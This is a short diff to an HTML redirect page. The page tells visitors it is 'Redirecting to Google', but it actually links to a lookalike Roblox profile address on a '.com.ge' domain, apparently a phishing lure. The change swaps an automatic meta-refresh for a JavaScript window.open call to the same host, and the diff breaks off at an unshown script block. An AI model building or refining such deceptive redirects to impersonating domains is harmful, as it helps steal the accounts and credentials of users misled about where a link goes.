@@ -3,12 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <title>Redirecting...</title>
-    <meta http-equiv="refresh" content="0; url=https://roblox.com.ge/users/7985095887/profile">
 </head>
 <body style="background-color: white;">
 
     <p>Redirecting to Google... If it doesn't open, 
-       <a href="https://roblox.com.ge/users/7985095887/profile" target="_blank" id="redirect-link">click here</a>.
+       <a href="#" onclick="window.open('https://roblox.com.ge/users/7985095887/profile', '_blank'); return false;">click here</a>.
     </p>
 
     <script>
